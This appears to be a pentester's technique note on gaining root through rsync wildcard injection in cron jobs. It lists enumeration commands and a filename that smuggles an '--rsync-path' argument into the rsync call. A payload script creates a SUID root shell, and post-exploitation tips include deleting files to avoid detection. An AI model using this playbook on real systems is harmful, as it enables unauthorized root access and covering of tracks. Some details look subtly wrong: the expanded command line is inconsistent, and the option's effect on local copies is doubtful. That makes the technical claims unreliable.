https://www.rangeforce.com/blog/tutorial-linux-wildcard-injection
https://www.exploit-db.com/papers/33930
https://youssef-ichioui.medium.com/abusing-rsync-misconfiguration-to-get-persistent-access-via-ssh-2507d4a1690b
## Wildcard Abuse – `rsync` Variant
### 1. Technique Name:

Wildcard Abuse via `rsync`
### 2. Summary:

When `rsync` is executed with wildcards to specify files—especially by a privileged context such as a root cron job—malicious filenames can inject additional options or trigger shell execution. By crafting filenames starting with `--`, an attacker can pass parameters that cause execution of arbitrary commands.
### 3. Conditions / Requirements:

- A privileged job (cron/script) runs an `rsync` command that includes a wildcard (`*`) not wrapped in safe quotes    
- The attacker has write access to the target directory
- The wildcards are expanded by the shell (not passed directly to `rsync`) so filenames are interpreted as arguments
### 4. Enumeration Steps:

1. Examine cron jobs and scripts:

```bash
grep -R "rsync .*\\*" /etc/cron* /usr/local/bin
```
 
2. Identify commands like:

```bash
rsync -av /data/backup/* /backup/
```

3. Check that wildcard expansion is performed by the shell, not by `rsync` itself.
### 5. Exploitation Steps:

1. Create a malicious filename to inject:

```bash
cd /path/with/rsync/wildcard
echo "" > "--rsync-path=sh payload.sh"
```
   
2. Write the payload script:

```bash
echo 'cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh' > payload.sh
chmod +x payload.sh
```
 
3. Wait for `rsync` job to run—it expands the wildcard to include your fake argument:
   
```bash
rsync -av /data/backup/* /backup/
```

becomes:

```bash
rsync -av /data/backup/ file1 --rsync-path=sh payload.sh file2 ...
```

This instructs `rsync` to set its own running binary path to your script, executing it with root privileges.

4. Use the newly SUID shell:

```bash
/tmp/rootsh -p
```
### 6. Post-Exploitation Tips:

- Remove the malicious filenames and scripts to avoid detection.    
- Use the root shell (`/tmp/rootsh`) to perform actions or persist.
- Investigate for additional wildcard-using scripts or cron jobs—this pattern is common in backup/maintenance utilities.
### 7. Example / Notes:

- Cron or script entry:

```cron
0 * * * * cd /data/backup && rsync -av * /backup/
```

- Crafted files in `/data/backup`:

```
--rsync-path=sh payload.sh
payload.sh        (script to copy SUID shell)
file1.txt         (normal data)
```

- After execution:
    - `/tmp/rootsh` exists with SUID bit set – root shell achieved.
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Wildcard_abuse #rsync